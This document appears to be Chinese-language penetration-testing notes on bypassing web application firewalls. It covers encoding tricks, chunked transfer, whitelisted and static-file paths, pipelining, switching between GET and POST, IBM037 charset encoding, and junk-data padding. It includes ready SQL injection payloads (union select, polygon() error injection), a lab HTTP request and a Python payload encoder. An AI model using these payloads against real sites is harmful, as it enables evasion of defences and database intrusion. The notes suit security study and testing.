# WAF Bypass
## 编码绕过
URL编码\
2次URL编码

## 生僻函数绕过
使用生僻函数替代常见的函数，例如在报错注入中使用 polygon()函数替换常用的 updatexml()函数
select polygon((select * from (select * from (select @@version) f) x));

## 分块传输绕过
### 什么是 chunked 编码？
分块传输编码（Chunked transfer encoding）是只在 HTTP 协议 1.1 版本（HTTP/1.1）中提供的一种数据传送机制。以往 HTTP 的应答中数据是整个一起发送的，并在应答头里 Content-Length 字段标识了数据的长度，以便客户端知道应答消息的结束。\
传统的 Content-length 解决方案：计算实体长度，并通过头部告诉对方。浏览器可以通过 Content-Length的长度信息，判断出响应实体已结束。\
Content-length 面临的问题：由于 Content-Length 字段必须真实反映实体长度，但是对于动态生成的内容来说，在内容创建完之前，长度是不可知的。\
这时候要想准确获取长度，只能开一个足够大的 buffer，等内容全部生成好再计算。这样做一方面需要更大的内存开销，另一方面也会让客户端等更久。\
我们需要一个新的机制：不依赖头部的长度信息，也能知道实体的边界——分块编码（Transfer-Encoding:chunked）。\
对于动态生成的应答内容来说，内容在未生成完成前总长度是不可知的。因此需要先缓存生成的内容，再计算总长度填充到 Content-Length，再发送整个数据内容。这样显得不太灵活，而使用分块编码则能得到改观。\
分块传输编码允许服务器在最后发送消息头字段。例如在头中添加散列签名。对于压缩传输传输而言，可以一边压缩一边传输。

### 分块传输工具
burpsuite插件：`chunked-coding-converter`

## 白名单绕过
有些 WAF 会自带一些文件白名单，对于白名单 waf 不会拦截任何操作，所以可以利用这个特点，可以试试白名单绕过。\
白名单通常有目录：
```http
/admin
/phpmyadmin
/admin.php
```

## 静态文件绕过
除了白名单信任文件和目录外，还有一部分 waf 并不会对静态文件进行拦截。\
例如 图片文件 jpg 、png 、gif 或者 css 、js 会对这些静态文件的操作不会进行检测从而绕过 waf 拦截。\
```http
/1.jpg&name=vince+&submit=1
/1.jpg=/1.jpg&name=vince+&submit=1
/1.css=/1.css&name=vince+&submit=1
```

## pipline 绕过注入
http 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用 burpsuite 截获的数据），其中包含了一个 Connection 字段，一般值为 close，apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的 http 请求所建立的 tcp 连接不断开，直到所发送内容结束 Connection 为 close 为止用 burpsuite 抓包提交 复制整个包信息放在第一个包最后，把第一个包 close 改成 keep-alive 把brupsuite 自动更新 Content-Length 勾去掉。

## http 相同参数请求绕过
waf 在对危险字符进行检测的时候，分别为 post 请求和 get 请求设定了不同的匹配规则，请求被拦截，变换请求方式有几率能绕过检测。如果程序中能同时接收 get、post 如果 waf 只对 get 进行匹配拦截，没有对 post 进行拦截。\
```php
<?php
echo $_REQUEST['id'];
?>
```

## HTTP 数据编码绕过
编码绕过在绕 waf 中也是经常遇到的，通常 waf 只坚持他所识别的编码，比如说它只识别 utf-8 的字符，但是服务器可以识别比 utf-8 更多的编码。\
那么我们只需要将 payload 按照 waf 识别不了但是服务器可以解析识别的编码格式即可绕过。
比如请求包中我们可以更改 Content-Type 中的 charset 的参数值，我们改为 ibm037 这个协议编码，有些服务器是支持的。payload 改成这个协议格式就行了。\
```http
```http
POST /06/vul/sqli/sqli_id.php HTTP/1.1
Host: 192.168.0.115
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded;charset:ibm037
Content-Length: 33
Connection: close
Cookie: PHPSESSID=e6sa76lft65q3fd25bilbc49v3; security_level=0
Upgrade-Insecure-Requests: 1
%89%84=%F1&%A2%A4%82%94%89%A3=%F1
```
透过 Content-Type 的 charset 绕过 waf#

未编码
```http
id=123&pass=pass%3d1
```

透过 IBM037 编码
```http
%89%84=%F1%F2%F3&%97%81%A2%A2=%97%81%A2%A2~%F1
```

在提交的 http header
```http
Content-Type: application/x-www-form-urlencoded; charset=ibm037
```

```python
import urllib.parse
s = 'id=-1 union select 1,user()-- &submit=1'
ens=urllib.parse.quote(s.encode('ibm037'))
print(ens)
```

## 填充垃圾数据
可以使用 select 0xA 运行一些字符从绕突破一些 waf 拦截\
`id=1 and (select 1)=(select
0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/*!union*//*!select*/1,user()`\
post 编码：\
`1+and+(select+1)%3d(select+0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/*!union*//*!select*
/1,user()&submit=1`

## 填充垃圾请求头

## Unicode 规范化

详见以下文件：https://gitcode.net/taochiyudadada/Penetration_Testing_POC/-/raw/master/books/Unicode%E7%9A%84%E8%A7%84%E8%8C%83%E5%8C%96%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF%E5%AE%9E%E6%93%8D.pdf?inline=false\
https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html